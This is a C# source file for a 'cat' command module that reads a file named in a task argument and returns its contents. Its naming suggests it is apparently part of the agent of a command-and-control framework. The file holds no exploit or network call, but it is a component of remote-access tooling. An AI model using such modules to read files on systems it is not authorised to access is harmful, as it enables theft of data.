using Engineer.Models;
using System;
using System.IO;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Engineer.Commands
{
    internal class Cat : EngineerCommand
    {
        public override string Name => "cat";

        public override string Execute(EngineerTask task)
        {
            try
            {
                if (task.Arguments.TryGetValue("/file", out string file))
                {
                    //read the content of file and return it
                    string content = File.ReadAllText(file);
                    if (content.Length == 0)
                    {
                        return "file does not exist or has no content";
                    }

                    return content;
                }
                return "Failed to read file content";
            }
            catch (Exception ex)
            {
                return "error: "+ex.Message;
            }
        }
    }
}
